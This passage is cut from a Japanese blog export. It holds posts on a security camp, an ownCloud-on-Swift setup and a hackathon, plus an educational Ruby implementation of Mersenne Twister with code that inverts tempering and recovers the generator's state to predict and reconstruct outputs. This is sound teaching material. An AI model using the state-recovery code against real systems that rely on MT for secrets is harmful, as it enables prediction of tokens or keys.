闇**\n\n一応グループワークの準備時間が毎日1～2時間くらいあったんですが、\n足りるはずもなく毎年恒例（らしい）徹夜進捗会に突入です。\n\nhttps://twitter.com/sekai67/status/764074021973471232\n\nなんかうちのグループは深夜4時位まで議論してました。\n議論し過ぎて話が広がりすぎて全員が分けわからなくなった結果、まとまりのない感じの主張になってしまいました……（反省）\n\n# 5日目\n\n## 起床トラック\n\n毎日ちょこちょこチューターさんに起こされる参加者さんがいたそうですが、\nボクは大丈夫ですよ！もちろん5日目を恥を晒すようなことはしていません！寝てないからね！（白目）\n\n## グループワーク発表\n\nみなさんクオリティが高い＞＜\n個人的に一番おもしろいなぁと思ったのは「一対三」さんのYouTuberの話です。\n\nhttps://twitter.com/security_camp/status/764280337169981440\n\n## 成果発表\n\nいきなり指名されたのでかなりキョドりました。（すみません）\nTLS徹底演習について簡単に説明したのですが、あの講義のスゴさを1割も伝えられなかった……\n\nhttps://twitter.com/security_camp/status/765064661205004290\n\n## おわり\n\n閉講式で修了証書をもらって、記念撮影をしておしまいです。\n5日間、あっという間でした。\n\n記念撮影の掛け声が「がんばるぞい！」だったの、一体なんなんでしょうね（すっとぼけ）\n\nhttps://twitter.com/security_camp/status/764694544092794881\n\n閉講式後、技術書がたくさんもらえます。\n魅力的な本がたくさんあったのですが、受け取る順番を決めるクジで**最下位**を引いたために、残念ながら欲しい本を手に入れることができず。\nロビーでもらったばかりの本を持ち寄ってサイン会が開かれているのを遠目に見てました……。\n\nhttps://twitter.com/security_camp/status/764662954834796544\n\nあ、キャンプ中は飲料水のペットボトルが（ほぼ）無限に配布され、至る所に転がっているんですが、\nボクはその余りをバックに入る限り詰め込んで持ち帰ってきました。（害悪）\n\n# 振り返って\n\nなかなか他ではできない経験ができましたし、参加できて良かったです。\n\nセキュキャンはいいぞ\n\n## もらったもの一覧\n\n![](2.jpg)\n","title":"セキュリティ・キャンプ全国大会2016に行った","image":null,"tags":["参加記","セキュリティ・キャンプ","CTF","セキュリティ"],"date":"2016-08-17T00:00:00.000Z","updated":"2021-01-07T13:52:12.000Z"},{"type":"article","slug":"8","body":"このはちゃんかわいい\n\nownCloud、便利なんですがファイルをVPS上に記録してるとConoHaはデフォで50GBしか使えないので辛い。\n\n増量しても良いんですけど、どうせなら容量単価の安いオブジェクトストレージに乗せられないか？というお話です。\n\n乗せられないか？というか、乗るんですけど。\n\n## ownCloudのインストール\n\n[公式](https://owncloud.org/install/)から落として設置してアクセスすれば初期設定画面になってあとはノリでなんとかなるので、\n特に書くこともないんですが、nginxを使ってる場合はキチンと設定しないとダメなので、そこだけ注意です。\n\n参考：[Nginx Configuration for the ownCloud 9.x Branches](https://doc.owncloud.org/server/9.1/admin_manual/installation/nginx_owncloud_9x.html?highlight=nginx)\n\n## オブジェクトストレージ上にファイルを置く\n\n[無制限ストレージ with 新しいConoHa Object Storage and ownCloud](http://qiita.com/ukitiyan/items/aaa1a2f3fe6e820007c0)\n\n↑みたいな、オブジェクトストレージをExternalStorageとして接続する方法もありますが、\nこれだとExternalStorageフォルダ外に置いたファイルが普通にローカルに記録されちゃうので、ちょっと微妙。\n\n全てのユーザがどこにファイルを置いてもオブジェクトストレージに置かれる方が好ましいです。\nということで、オブジェクトストレージをPrimaryStorageとして設定しましょう。\n\nConoHaのオブジェクトストレージの正体はOpenStack Swiftなので、ownCloudに最初から入ってる機能でなんとかなります。\n\nまず、予めコンテナを作成しておく必要があるのですが、ConoHaのオブジェクトストレージにはGUIがないので、コマンドラインツールでなんとかしましょう。\nとりえあず、pipを使える環境にしてから、\n\n```bash\n$ pip install python-swiftclient python-keystoneclient\n$ export OS_AUTH_URL=\"https://identity.tyo1.conoha.io/v2.0\"\n$ export OS_TENANT_NAME=\"[テナント名]\"\n$ export OS_USERNAME=\"[APIユーザ名]\"\n$ export OS_PASSWORD=\"[APIユーザPW]\"\n$ swift post \"[作成するコンテナ名]\"\n$ swift list\n```\n\nこんなかんじで、作成したコンテナ名が表示されればOKです。\n\nownCloudの初期設定を終えると、`config/config.php`が作成されるハズなので、このファイルに設定を追記します。\n\n```php\n$CONFIG = array (\n  ...\n\n  'objectstore' =>\n  array (\n    'class' => 'OC\\\\Files\\\\ObjectStore\\\\Swift',\n    'arguments' =>\n    array (\n      'serviceName' => 'Object Storage Service',\n      'url' => 'https://identity.tyo1.conoha.io/v2.0',\n      'region' => 'tyo1',\n      'tenantName' => '[テナント名]',\n      'username' => '[APIユーザ名]',\n      'password' => '[APIユーザPW]',\n      'container' => '[作成したコンテナ名]',\n    ),\n  ),\n\n  ...\n);\n```\n\nこれでOK。\n見た目はなんにも変わってないので設定できてるのか不安になりますが、\n適当なファイルをアップロードしてみてから、\n\n```bash\n$ swift list [作成したコンテナ名]\n```\n\nとやって`urn:oid:***`みたいなファイルが作成されていればOKです。\n\nこれで、ownCloud上の全てのファイルがオブジェクトストレージに置かれるようになります。\nこの設定をすると、今までローカルに保存していたファイルは参照できなくなってしまう（開こうとするとエラーになる）ので、\n運用中に切り替えるのは避けて、インストールした直後に設定を行うのがベターです。\n\n\n## かくして\n\n格安で大量のファイルを保存できる環境が手に入りました。やった！\n\nちなみに、CUIからオブジェクトストレージを操作するツールはOpenStack公式のpython-swiftclient以外にも、\nConoHaの中の人が作成されている[conoha-ojs](https://github.com/hironobu-s/conoha-ojs)もあります。\n\n[conoha-ojs](https://github.com/hironobu-s/conoha-ojs)\n","title":"ownCloudをConoHaのオブジェクトストレージに乗せる","image":null,"tags":["ConoHa","ownCloud","OpenStack Swift"],"date":"2016-07-27T00:00:00.000Z","updated":"2021-01-07T09:09:45.000Z"},{"type":"article","slug":"7","body":"[Hack U 東京工業大学 2016](http://hacku.yahoo.co.jp/titech2016/)に出ました。\n\n[Hack U 東京工業大学 2016](http://hacku.yahoo.co.jp/titech2016/)\n\n> プログラミングやデザインを通して、あなたのアイデアを形にしてみませんか？\n> Hack U（ハック・ユー）は、学生のための「ものづくり体験イベント」です。\n\n> Hackとは、創意工夫のこと。\n> 世界中のYahoo!で開催されている開発コンテスト\"Hack Day\"をベースに、ヤフーと教育機関が共同開催しているのが\"Hack U\"です。\n\nもう1月も前のことですが、行ってきました。\n\n![](1.jpg)\n\nテーマは「チーム活動に関する何か」で、\n開発時間は24時間†きっかり†です。\n\n# 何を作ろうか？\n\nボクらのチームですが、とりあえず何を作るかだけ前もって決めとこうというコトで、話し合ってたんですが、\nなんか凡庸なアイデアばかりで、HackUでウケそうなネタが浮かんでこないんですよね。\n\nみんながアイデア出しに飽きてきた頃\n\n！？\n\nじゃあこういう退屈な会議を改善するプロダクトはどうだろう？\nということで[@kotarou777775](https://twitter.com/kotarou777775)くんが**強い**案を出してくれました。\n\n何を作ったかの具体的な説明は、あとで。\n\n# 開発1日目 (6/10)\n\nこれはハッカソンあるあるなんですが、開発初日は何故か余裕綽々なんですよね。\nなんか行けそうな気がする、むしろ行ける気しかしない。\n\n![](2.jpg)\n\nこんな感じで開発に使う物品を大学のお金で買ってもらえます。スゴイ。\n\n![](3.jpg)\n\nボクらはKinectを買ってもらいました。\n\n俄然上がるテンション。\n\n![](4.jpg)\n\nKinectのテストをするチームメイト。\n\n途中、Yahoo! JAPANの社内見学をさせてもらいました。\n働きやすそうな会社だなと思いました。（小並感）\n\nこんな様子で1日目はふわっと終了。\n\n![](5.jpg)\n\nラーメンを食べに行きました。一風堂です。\n\n\n# 開発2日目 (6/11)\n\n午前中は昨日と同じ雰囲気でのんびりしてました。\n知り合いのチームにちょっかいを出しに行ったり。\n\n![](6.jpg)\n\nハッカソンのお供ですね。\nどっちも[@0213_ryota](https://twitter.com/0213_ryota)くんにもらいました。神。\n\nそしてお昼を食べ終わった頃、進捗を確認して、\n「_アレ、大丈夫かコレ！？_」となるまでがお約束ですね。\n\n- 主要な機能である音声認識の精度がなんか微妙\n- フロントの表示部分に物理演算的なあるんだけどめっちゃバグってる\n- Kinectとの通信を全くテストしてない\n- 発表用のスライドに全く手を付けてない\n\nみたいなカンジでとにかくあたふたしてました。\n\nま、まぁ夜までには†なんとか†なったんですが。\n\nあ、ちなみにボクらのチームでは\n\n- サーバー / クライアント(バックエンド)\n- クライアント(フロントエンド)\n- Kinect\n- UI部品\n\nってカンジで分担してやってました。\n\n今日もラーメンを食べました。六本木は高いお店が多いので庶民的な一蘭はイイですね。8\n\n![](7.jpg)\n\n\n# 発表日 (6/12)\n\n昨日は「家で発表スライド作るぞ！」とか言って帰ったんですが、\n気がついたら時計が **6/12 9:00** とかなってて焦りましたね。\n\nハッカソンは発表が最重要と言っても過言じゃないですし、コレは致命的。\nとりあえず光の速さでスライドを作って六本木に向かいました。\n\nなんかこの日チームメイト3人が各々の用事で遅刻してくるそうで、\nボクが到着した時点で成果発表会が始まる1時間位前（大遅刻です）だったんですけど、\nまわりがワイワイしてるのに、ボクのチームが1人しかいなくて悲しかったです。\n\nというか、ボクのチームだけ発表会直前まで誰も来てなくてヤフーの人が若干イライラしてました。（すみません）\n\n![](8.jpg)\n![](9.jpg)\n\n発表の様子です。[動画](https://www.youtube.com/watch?v=jBqVcu36Yj8&t=1h18m54s)\n\nで、ボクらの作ったものなんですが、[このスライド](https://prezi.com/0-bdffxtth5n/the-future-of-discussion/)を見てもらえればだいたい分かると思います。\n\n![](10.jpg)\n\nこんなの。\n\n## 他のチームの作品を見て\n\nHackU参加チームの過半数が[ウチのサークル](https://trap.jp/tag/hack-u-2016/)だったのもあって、ゲームが多かったですね。\nでも、どれもみんなテーマの「チーム活動に関する何か」を意識していて良いなと感じました。\n\n気がかりだったのが、**ボクらのチームとネタが被ってる作品が他に2つあった**ことです。\nしかも完成度が向こうのほうが明らかに上ときました。八方塞がりです。やべぇよやべぇよ。\n\n音声認識系のプロダクトもほかに数個ありましたし、独創性がアピールしにくかったですね。\n\n## 表彰\n\n↑って状況だったので、うーんってカンジだったんですけど、なんかヤフー賞を頂けました。（びびった）\n\n![](11.jpg)\n\n副賞でTポイントもらいました。やったー。\n\n![](12.jpg)\n\n記念撮影です。\n\n\n# 以上\n\n楽しかった！\n\n技術力も発表力も圧倒的成長できるしHackUって神だな……\n\n来年も是非是非是非是非お願いします！！！！！！！\n","title":"HackUに出た","image":null,"tags":["参加記","ハッカソン","HackU"],"date":"2016-07-11T00:00:00.000Z","updated":"2021-01-07T13:52:12.000Z"},{"type":"article","slug":"6","body":"メルセンヌ・ツイスタの性質を理解したい。\n\nこの記事は前回の続きです。\n\n[メルセンヌ・ツイスタをわかった気になる](/posts/5/)\n\n## 今日のテーマ\n\n今日のテーマは、メルセンヌ・ツイスタ(MT)の性質についてです。\n\nMTの生成する乱数列は、以下の線形漸化式で表わされるのでした。\n\n$$\n\\begin{array}{c}\n\t\\mathbf{x}_{k+n} \\, = \\, \\mathbf{x}_{k+m} \\oplus ( \\mathbf{x}^u_k \\: | \\: \\mathbf{x}^l_{k+1} ) A \\\\\n\t(k = 0,1, \\cdots)\n\\end{array}\n$$\n\n漸化式で表わされるということは、連続した生成された乱数をいくつか集めれば、その次に現れる数値が予測可能じゃないか！？！？！？？\nまた逆に、今まで生成された乱数値も復元できるんじゃないか！？！？？？！\n\nワクワクしますね！\n\n# 打倒Tempering\n\nさて、さっそく……といいたいところですが、そういえば乱数値はTemperingとかいう操作をしてから出力していましたね。\n乱数を予測するには、コイツをどうにかしなければなりません。\n\n前回はTempering行う行列$T$は正則だから逆行列が求まるよね？みたいな話をして終わりました。\n\n以下の様な謎のビット演算が$T$を右から掛けることに相当する、というお話でしたが\nこの$T$がどんな行列なのかを調べることにしましょう。\n\n$$\n\\begin{array}{l}\n\t\\mathbf{y}_1 = \\mathbf{x} \\oplus (\\mathbf{x} \\gg u) \\\\\n\t\\mathbf{y}_2 = \\mathbf{y}_1 \\oplus ((\\mathbf{y}_1 \\ll s) \\: \\& \\: \\mathbf{b}) \\\\\n\t\\mathbf{y}_3 = \\mathbf{y}_2 \\oplus ((\\mathbf{y}_2 \\ll t) \\: \\& \\: \\mathbf{c}) \\\\\n\t\\mathbf{y}_4 = \\mathbf{y}_3 \\oplus (\\mathbf{y}_3 \\gg l)\n\\end{array}\n$$\n\nそういえば前回、何の脈絡もなく整数を各ビットで分けて行ベクトルとしていましたが、\nなんで行ベクトルを考えるのかというと、計算上都合がいいからです。\n例えば、XOR演算はベクトル同士の加算で表現できますし、ビットシフトは適当な正方行列との積で表現できます。\n\nあっ！じゃあ↑の式も一つ一つのビット演算が行列として表せるじゃん！！！\n\n## ビットシフトの行列表現\n\nこれはすぐに思いつきそうです。\n単純に各要素をずらすだけなので、単位行列を列ベクトル分解して、それをずらしたものを掛ければよさそう。\n\n例えば、8ビット整数について2ビットの右シフトを表す行列は以下になります。\n\n$$\nS_8 = \\left(\n\t\\begin{array}{ccccc}\n\t\t0 & 0 & 1 & 0 & 0 & 0 & 0 & 0 \\\\\n\t\t0 & 0 & 0 & 1 & 0 & 0 & 0 & 0 \\\\\n\t\t0 & 0 & 0 & 0 & 1 & 0 & 0 & 0 \\\\\n\t\t0 & 0 & 0 & 0 & 0 & 1 & 0 & 0 \\\\\n\t\t0 & 0 & 0 & 0 & 0 & 0 & 1 & 0 \\\\\n\t\t0 & 0 & 0 & 0 & 0 & 0 & 0 & 1 \\\\\n\t\t0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 \\\\\n\t\t0 & 0 & 0 & 0 & 0 & 0 & 0 & 0\n\t\\end{array}\n\\right)\n$$\n\nこの記事中では、$S_n$をビットシフトを表す行列とします\nただし、$n < 0$のとき$|n|$ビット左シフトを、$n > 0$のとき$n$ビット右シフトを表すとします。\n\n## ANDの行列表現\n\nこれは対角成分がAND演算する整数の各ビットの値になった正方行列を考えれば良いです。\n例えば、8ビット整数について`178 = 0b10110010`とのANDを表す行列は以下のように書けます。\n\n$$\nD_{178} = \\left(\n\t\\begin{array}{ccccc}\n\t\t1 & 0 & 0 & 0 & 0 & 0 & 0 & 0 \\\\\n\t\t0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 \\\\\n\t\t0 & 0 & 1 & 0 & 0 & 0 & 0 & 0 \\\\\n\t\t0 & 0 & 0 & 1 & 0 & 0 & 0 & 0 \\\\\n\t\t0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 \\\\\n\t\t0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 \\\\\n\t\t0 & 0 & 0 & 0 & 0 & 0 & 1 & 0 \\\\\n\t\t0 & 0 & 0 & 0 & 0 & 0 & 0 & 0\n\t\\end{array}\n\\right)\n$$\n\n対角に`10110010`が現れています。\nなんでコレがAND演算を表すのかは、左から適当な行ベクトルを掛けて、手で計算してみればすぐにわかるはずです。\n\nこの記事中では、$D_n$を$n$とのAND演算を表す行列とします。\n\n## XORの行列表現\n\n`A = 0b1001, B = 0b1001`としたとき、`A xor B`を考えてみます。\n\n| A | B | A xor B |\n|:-:|:-:|:-------:|\n| 1 | 0 |    1    |\n| 0 | 1 |    1    |\n| 0 | 0 |    0    |\n| 1 | 1 |    0    |\n\n各ビットについて見ると、1ビット同士の加算になっています。（桁があふれた分は無視です。）\nということはどうやら、2つの整数のXOR演算は、それら整数を表す行ベクトルを単純に加算するだけで良さそうです。\n\n## Temperingの逆演算\n\nさて、材料は揃いました。\nさっそく、Temperingの逆演算を表す行列を求めるとしましょう。\n\n例のビット演算で書かれた式を行列で表してみます。\n\n$$\n\\begin{array}{l}\n\t\\mathbf{y}_1 = \\mathbf{x} + \\mathbf{x} S_u = \\mathbf{x} (I + S_u) \\\\\n\t\\mathbf{y}_2 = \\mathbf{y}_1  + \\mathbf{y}_1 S_{-s} D_b = \\mathbf{y}_1 ( I + S_{-s} D_b ) \\\\\n\t\\mathbf{y}_3 = \\mathbf{y}_2  + \\mathbf{y}_2 S_{-t} D_c = \\mathbf{y}_2 ( I + S_{-t} D_c ) \\\\\n\t\\mathbf{y}_4 = \\mathbf{y}_3 + \\mathbf{y}_3 S_l = \\mathbf{y}_3 ( I + S_l )\n\\end{array}\n$$\n\nで、式が4本もあると面倒ですし、1つにまとめてしまいましょう。\n\n$$\n\\mathbf{y} = \\mathbf{x} (I + S_u) ( I + S_{-s} D_b ) ( I + S_{-t} D_c ) ( I + S_l )\n\n$$\n\nということで、ようやく$T$の本性が分かりました。\n\n$$\nT = (I + S_u) ( I + S_{-s} D_b ) ( I + S_{-t} D_c ) ( I + S_l )\n\n$$\n\nで、コイツの逆行列$T^{-1}$を求めれば、それがTemperingの逆演算を表す行列です。\n\n# 乱数を予想する\n\nさて、Temperingの逆演算ができれば、話は早いですね！\n\n前回作ったプログラムの _MT内部状態_ を表す配列を、先ほどの手順で復元した値N個で埋めてやれば、\nあとは前回説明した計算方法に従って次に出現する乱数を計算することが出来ます。やった！\n\n# 乱数を復元する\n\nじゃあ、今まで作られたであろう乱数を復元するには？\n\nとりあえず内部状態$\\mathbf{x}$をまず復元しなければならないワケですが、\nMTの漸化式を見ると、$x_k$の上位ビットが$x_{k+n}$の、下位ビットが$x_{k+n-1}$の計算に使われてるなーって気が付くとおもいます。\n\nじゃあ、その計算の逆をやれば、$x_k$が復元できるネ！っていうお話です。\n幸い、漸化式中に現れる演算はさっきやったXOR演算と、既に中身が分かっている行列$A$の乗算だけです！\n\nAはこんな行列なのでした。\n\n$$\nA = \\left(\n\t\\begin{array}{ccccc}\n\t\t0 & 1 & 0 & 0 & 0 \\\\\n\t\t0 & 0 & 1 & 0 & 0 \\\\\n\t\t0 & 0 & 0 & \\ddots & 0 \\\\\n\t\t0 & 0 & 0 & 0 & 1 \\\\\n\t\ta_{w-1} & a_{w-2} & \\cdots & \\cdots & a_0\n\t\\end{array}\n\\right)\n$$\n\nこの定義を見ると、$a_{w-1} \\ne 0$ならば明らかに正則ですねコレ。\nMT19937では↑を満たしますし、逆行列も求まりますね！\n\n元の[論文](http://www.math.sci.hiroshima-u.ac.jp/~m-mat/MT/ARTICLES/mt.pdf)には、高速に計算するためにこの形にするって書いてあるんですけど、\nコレ正則じゃなくても良いのかな？そうだとすると逆演算ができない？？？（知らない）\n\n# やってみよう！\n\n早速やりましょう。\nとりあえず、前回作ったプログラムで生成した乱数をファイルに書き出して、それを入力して、その部分乱数列から全体を復元しましょう。\n\nはい、やり方はさっきまでさんざん書いたとおりなので、サクッと実装します。\n今回もRubyです。\n\n```ruby\nrequire \"matrix\"\n\n# MT19937\nW = 32\nN = 624\nM = 397\nR = 31\nU = 11\nS = 7\nT = 15\nL = 18\nA = 0x9908B0DF\nB = 0x9D2C5680\nC = 0xEFC60000\n\n# ビットマスク用\nWHOLE_MASK = (\"1\" * W).to_i(2)\nUPPER_MASK = (\"1\" * (W - R) + \"0\" * R).to_i(2)\nLOWER_MASK = (\"0\" * (W - R) + \"1\" * R).to_i(2)\n\n# ビット行列\nclass BitMat < Matrix\n\t# 行ベクトルを整数に\n\tdef to_i\n\t\t# mod 2 しないとダメ\n\t\tself.row(0).to_a.map{|i| i.to_i.abs % 2 }.join.to_i(2)\n\tend\n\t# 整数を行ベクトルに\n\tdef self.from_i(i)\n\t\tself[format(\"%.\" + W.to_s + \"b\", i).split(\"\").map(&:to_i)]\n\tend\n\n\t# kだけビットシフトする演算を表す行列を生成 (k > 0 : 右シフト, k < 0 : 左シフト)\n\tdef self.Shift(k)\n\t\tself[ *(1..W).map{|i| (1..W).map{|j| j == i+k ? 1 : 0 } } ]\n\tend\n\t# kとのAND演算を表す行列を生成\n\tdef self.And(k)\n\t\tself.diagonal(*self.from_i(k).row(0).to_a)\n\tend\n\n\t# r行目を行ベクトルvで置き換え\n\tdef []=(r, v)\n\t\t@rows[r] = v.row(0).to_a\n\tend\nend\n\n########################################\n\n# 行列T\nt = (\n\t(BitMat.I(W) + BitMat.Shift( U)) *\n\t(BitMat.I(W) + BitMat.Shift(-S) * BitMat.And(B)) *\n\t(BitMat.I(W) + BitMat.Shift(-T) * BitMat.And(C)) *\n\t(BitMat.I(W) + BitMat.Shift( L))\n)\n# Tの逆行列\nt_inv = t ** -1\n\n# 行列A\na = BitMat.Shift(1)\na[W-1] = BitMat.from_i(A)\n# Aの逆行列\na_inv = a ** -1\n\n# 乱数列を読み込む\ninput = []\nwhile line = gets\n\tinput.push($1.to_i) if /^\\d+: (\\d+)$/ =~ line\nend\n\n# E番目からN個だけの乱数を使う\nE = input.length / 3\n\nprint \"USE: \" + E.to_s + \" -> \" + (E + N - 1).to_s + \"\\n\";\n\n# E番目～E+N-1番目の乱数を取得し、Temperingの逆演算をする\nxr = input[E, N].map{|e| (BitMat.from_i(e) * t_inv).to_i }\n\n# 内部状態\nx = xr.dup\n\n# E+N番目から順に乱数列を復元\n(E + N).upto(input.length - 1) do |k|\n\ti = (k - E) % N\n\n\t# 乱数を計算\n\tz = x[i] & UPPER_MASK | x[(i + 1) % N] & LOWER_MASK\n\tx[i] = x[(i + M) % N] ^ (BitMat.from_i(z) * a).to_i\n\n\t# Temperingして一致するか確認\n\ty = (BitMat.from_i(x[i]) * t).to_i\n\tif y != input[k]\n\t\tabort \"FAIL: \" + k.to_s + \"\\n\";\n\tend\nend\n\nprint \"RETRIEVED: \" + (E + N).to_s + \" -> \", input.length - 1,\"\\n\";\n\n# 内部状態\nx = xr.dup\n\n# E-1番目から順に0番目までの乱数列を復元\n(E - 1).downto(0) do |k|\n\ti = (k - E) % N\n\n\t# z_i を復元\n\tz = (BitMat.from_i(x[i] ^ x[(i + M) % N]) * a_inv).to_i\n\n\t# z_{i-1} を復元\n\tzp = (BitMat.from_i(x[(i - 1 + N) % N] ^ x[(i - 1 + M) % N]) * a_inv).to_i\n\n\t# z_i, z_{i-1} から x[i] を復元\n\tx[i] = z & UPPER_MASK | zp & LOWER_MASK\n\n\t# Temperingして一致するか確認\n\ty = (BitMat.from_i(x[i]) * t).to_i\n\tif y != input[k]\n\t\tabort \"FAIL: \" + k.to_s + \"\\n\";\n\tend\nend\n\nprint \"RETRIEVED: 0 -> \" + (E - 1).to_s + \"\\n\";\n```\n\n今回は、MTで乱数を生成する際にも行列を用いて計算してみました。なのでとても遅いですね。\n\nちなみに、わざわざ行列を使わなくてもTemperingの逆演算をビット演算で高速に行うことも出来ます。\n\n[メルセンヌ・ツイスタのtemperingの逆関数に関する考察 - Plus Le Blog](http://plusletool.hatenablog.jp/entry/2014/10/24/213816)\n\n# MTはダメ？\n\n_わー！MTで作った乱数は予想・復元されちゃう！危ない！_\n\nというわけではなく、要は適材適所、その性質をよく理解して使うべき、ということでした。\n決して暗号用途に使っちゃダメですよ。（そういうCTF問題がどこかにありましたね……！）\n\n次は **xorshift** を調べてみようかな？\n","title":"メルセンヌ・ツイスタを倒す","image":null,"tags":["メルセンヌ・ツイスタ","乱数","CTF","セキュリティ"],"date":"2016-06-30T00:00:00.000Z","updated":"2021-01-07T09:09:45.000Z"},{"type":"article","slug":"5","body":"メルセンヌ・ツイスタについて。\n\nメルセンヌ・ツイスタ(MT)は擬似乱数列を作るアルゴリズムの一つで、\n他の手法と比べると欠点が少なくて高品質な擬似乱数列を高速に作れるんだって。スゴイ！\nプログラムをかじった人なら、多分聞いたことがあるんじゃないかと思います。\n\n日本初のアルゴリズムだし、日本語文献あるかな？って思ったんですけど、良い物が見つからなかった（かなしい）ので、\n元の[論文](http://www.math.sci.hiroshima-u.ac.jp/~m-mat/MT/ARTICLES/mt.pdf)を読みながらRubyでMTを実装して理解を深めたいと思います。\n\nなんか強いアルゴリズムだ！って聞くとめっちゃ複雑なんじゃないかって思いがちですけど、MTはとっても<span style=\"font-size:1.5em\">**†単純†**</span>です。\n\n# MTの定義\n\n$w$ビットの整数からなる乱数列を生成する場合を考えます。\nこの時、整数を各ビットで分けて$w$次元行ベクトルとして考えることとします。\n\nすると、MTによって生成される乱数列は以下の線形漸化式によって表されます。\n\n$$\n\\begin{array}{c}\n\t\\mathbf{x}_{k+n} \\, = \\, \\mathbf{x}_{k+m} \\oplus ( \\mathbf{x}^u_k \\: | \\: \\mathbf{x}^l_{k+1} ) A \\\\\n\t(k = 0,1, \\cdots)\n\\end{array}\n$$\n\nこの式に登場する$n,m$は定数で、$1 \\le m \\le n$を満たします。\n\n$( \\mathbf{x}^u_k \\: | \\: \\mathbf{x}^l_{k+1} )$は、$\\mathbf{x}_k$の上位$w-r$ビットと$\\mathbf{x}_{k+1}$の下位$r$ビットを連結した行ベクトルを表しています。\nこの$r$も定数で、$0 \\le r \\le w-1$を満たします。\n\n$A$は以下のように定義された$w \\times w$正方行列です。\n\n$$\nA = \\left(\n\t\\begin{array}{ccccc}\n\t\t0 & 1 & 0 & 0 & 0 \\\\\n\t\t0 & 0 & 1 & 0 & 0 \\\\\n\t\t0 & 0 & 0 & \\ddots & 0 \\\\\n\t\t0 & 0 & 0 & 0 & 1 \\\\\n\t\ta_{w-1} & a_{w-2} & \\cdots & \\cdots & a_0\n\t\\end{array}\n\\right)\n$$\n\nこれによって、$\\mathbf{x} A$を以下のように高速に計算することができます。\n\n$$\n\\begin{array}{c}\n\t\\mathbf{x} A = \\begin{cases}\n\t\t(\\mathbf{x} \\gg 1) & (x_0 = 0) \\\\\n\t\t(\\mathbf{x} \\gg 1) \\oplus \\mathbf{a} & (x_0 = 1)\n\t\\end{cases} \\\\\n\t\\\\\n\t\\mathbf{x} = (x_{w-1}, x_{w-2}, \\cdots, x_0) \\\\\n\t\\mathbf{a} = (a_{w-1}, a_{w-2}, \\cdots, a_0)\n\\end{array}\n$$\n\nこうして、$w$ビットの整数、もとい$w$次元行ベクトルがたくさんできるわけですが、\nこれをそのまま乱数として出力するのはなんだかマズいらしくて、\n値を程よく分布させるため、出力する行ベクトルに$w \\times w$の適当な**正則行列**$T$を右から掛けます。\n\n$T$を右から掛ける事に相当する演算として、実際には以下の様な演算を行います。\n\n$$\n\\begin{array}{l}\n\t\\mathbf{y}_1 = \\mathbf{x} \\oplus (\\mathbf{x} \\gg u) \\\\\n\t\\mathbf{y}_2 = \\mathbf{y}_1 \\oplus ((\\mathbf{y}_1 \\ll s) \\: \\& \\: \\mathbf{b}) \\\\\n\t\\mathbf{y}_3 = \\mathbf{y}_2 \\oplus ((\\mathbf{y}_2 \\ll t) \\: \\& \\: \\mathbf{c}) \\\\\n\t\\mathbf{y}_4 = \\mathbf{y}_3 \\oplus (\\mathbf{y}_3 \\gg l)\n\\end{array}\n$$\n\n$u,s,t,l$は定数で、&はビットAND演算を表し、$\\mathbf{b}, \\mathbf{c}$は適当な行ベクトルです。\n\nこうして得られた$\\mathbf{y_4}$を出力します。\n（この操作を _Tempering_ と言うそうです。）\n\nで、途中にいろいろ定数やらなんやらが登場したんですが、これらを\n\n$$\n\\begin{array}{l}\n\tw = 32 \\\\\n\tn = 624 \\\\\n\tm = 397 \\\\\n\tr = 31 \\\\\n\tu = 11 \\\\\n\ts = 7 \\\\\n\tt = 15 \\\\\n\tl = 18 \\\\\n\t\\mathbf{a} = \\mathbf{0x9908B0DF} \\\\\n\t\\mathbf{b} = \\mathbf{0x9D2C5680} \\\\\n\t\\mathbf{c} = \\mathbf{0xEFC60000}\n\\end{array}\n$$\n\nとすると、周期が$2^{19937}-1$とめちゃくちゃ長い、かの有名なMT19937になります。\n\n# MTを実装する\n\nなんだか、 _は？_ ってカンジですね！\n\n整理すると、\n\n- 長さnの配列を用意して、適当な値で埋める（これがシード値になります）\n- i番目の乱数を得る\n  - Step.1 `z = x[i] & 0b111..1000..0 | x[(i+1)%n] & 0b000..0111..1` を計算する\n  - Step.2 `x[i] = x[(i+m)%n] ^ (z >> 1) ^ (z & 1 == 0 ? 0 : a)` を計算する\n  - Step.3 Temperingした値を返す\n\nこれだけです。シンプルだ！\n\nStep.1は$( \\mathbf{x}^u_k \\: | \\: \\mathbf{x}^l_{k+1} )$を求めることに相当します。\nStep.2は 最初の漸化式を適用することに相当し、XORで繋がれた後ろの2項は、行列$A$を掛けることに相当します。\n\n自分みたいなプログラマな人間は、たぶんソースコードを見れば一発で理解できるんじゃないかと思います。\nということで、書いてみたのが以下。\n\n```ruby\n# MT19937\nW = 32\nN = 624\nM = 397\nR = 31\nU = 11\nS = 7\nT = 15\nL = 18\nA = 0x9908B0DF\nB = 0x9D2C5680\nC = 0xEFC60000\n\n# ビットマスク用\nWHOLE_MASK = (\"1\" * W).to_i(2)\nUPPER_MASK = (\"1\" * (W - R) + \"0\" * R).to_i(2)\nLOWER_MASK = (\"0\" * (W - R) + \"1\" * R).to_i(2)\n\n# MT乱数列\nclass MT\n\t# seedを受け取って初期化\n\tdef initialize(seed)\n\t\t# MT内部状態\n\t\t@i = 0\n\t\t@x = [seed & WHOLE_MASK]\n\n\t\t# 初期化 (mt19937ar.cに準拠)\n\t\t1.upto(N-1) do |i|\n\t\t\t@x[i] = (1812433253 * (@x[i-1] ^ (@x[i-1] >> 30)) + i) & WHOLE_MASK\n\t\tend\n\tend\n\n\t# MTで乱数を生成\n\tdef next\n\t\t# Step.1\n\t\tz = @x[@i] & UPPER_MASK | @x[(@i + 1) % N] & LOWER_MASK\n\n\t\t# Step.2\n\t\t@x[@i] = @x[(@i + M) % N] ^ (z >> 1) ^ (z & 1 == 0 ? 0 : A)\n\n\t\t# Step.3\n\t\ty = @x[@i]\n\t\ty = y ^ (y >> U)\n\t\ty = y ^ ((y << S) & B)\n\t\ty = y ^ ((y << T) & C)\n\t\ty = y ^ (y >> L)\n\n\t\t# カウンタを変更して、生成した乱数を返す\n\t\t@i = (@i + 1) % N\n\t\treturn y\n\tend\nend\n\n########################################\n\n# 使ってみる\nmt = MT.new(20150919) # ← シード値\n2048.times do |i|\n\tprint i, \": \", mt.next, 